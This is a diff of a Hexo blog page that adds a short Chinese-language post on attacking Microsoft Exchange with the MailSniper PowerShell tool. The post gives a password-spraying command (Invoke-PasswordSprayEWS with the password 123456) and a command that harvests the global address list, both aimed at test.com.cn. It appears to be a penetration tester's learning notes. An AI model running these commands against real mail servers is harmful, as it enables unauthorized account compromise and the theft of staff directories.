@@ -53,7 +53,7 @@
     </div>
     <div class="contents" id="nav-content">
         <ul>
-            <li  class=active >
+            <li >
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
                     <span>HOME</span>
@@ -88,6 +88,10 @@
         </ul>
     </div>
     
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Exchange-密码爆破"><span class="toc-text">Exchange 密码爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#爆破密码："><span class="toc-text">爆破密码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爬取用户列表："><span class="toc-text">爬取用户列表：</span></a></li></ol></li></ol>
+</div>
+    
 </div>
 
 
@@ -111,28 +115,37 @@
     <div class="index-middle">
         <!-- Main Content -->
         
-<div class="post-preview-container" style="min-height: 720px">
-    
-    <div class="post-preview">
-        <div class="post-time">2018-08-27</div>
-        <div class="post-info">
-            <a href="/2018/08/27/exchange/">
-                <h3>
-                    Untitled
-                </h3>
-            </a>
-            <p>
-                
-            </p>
+
+
+<div class="post-container">
+    <div class="post-title">
+        
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-08-27 00:42:21</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="Exchange-密码爆破"><a href="#Exchange-密码爆破" class="headerlink" title="Exchange 密码爆破"></a>Exchange 密码爆破</h1><p>学习文章：<br><a href="https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/</a></p>
+<p>项目地址：<br><a href="https://github.com/Labs22/BlackServerOS/blob/14271336a377e567e9c1ee00950b002c73749c84/information-gathering/MailSniper-master/MailSniper-master/MailSniper.ps1" target="_blank" rel="noopener">https://github.com/Labs22/BlackServerOS/blob/14271336a377e567e9c1ee00950b002c73749c84/information-gathering/MailSniper-master/MailSniper-master/MailSniper.ps1</a></p>
+<p>##首先import 模块</p>
+<p><img src="http://ow7nq66xr.bkt.clouddn.com/15137881549641.jpg" alt=""></p>
+<h2 id="爆破密码："><a href="#爆破密码：" class="headerlink" title="爆破密码："></a>爆破密码：</h2><p><img src="http://ow7nq66xr.bkt.clouddn.com/15258822732796.jpg" alt=""></p>
+<p><img src="http://ow7nq66xr.bkt.clouddn.com/15258823729155.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Invoke-PasswordSprayEWS -ExchHostname test.com.cn -UserList .\1.txt -Password 123456 -Threads 15 -OutFile e</span><br><span class="line">ws-sprayed-creds1.txt</span><br></pre></td></tr></table></figure>
+<h2 id="爬取用户列表："><a href="#爬取用户列表：" class="headerlink" title="爬取用户列表："></a>爬取用户列表：</h2><p><img src="http://ow7nq66xr.bkt.clouddn.com/15258824325200.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-GlobalAddressList -ExchHostname test.com.cn -UserName anquanceshi -Password 123456 -OutFile global-addr</span><br><span class="line">ess-list1.txt</span><br></pre></td></tr></table></figure>
+
+        
+        <div id="comment-container">
         </div>
     </div>
-    
 </div>
-<ul class="pager">
-    
-    
-</ul>
-
     </div>
 </div>
 
@@ -171,7 +184,7 @@
     // We expose some of the variables needed by the front end
     window.hexo_search_path = "search.xml"
     window.hexo_root = "/"
-    window.isPost = false
+    window.isPost = true
 </script>
 <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
 <script src="/js/index.js"></script>
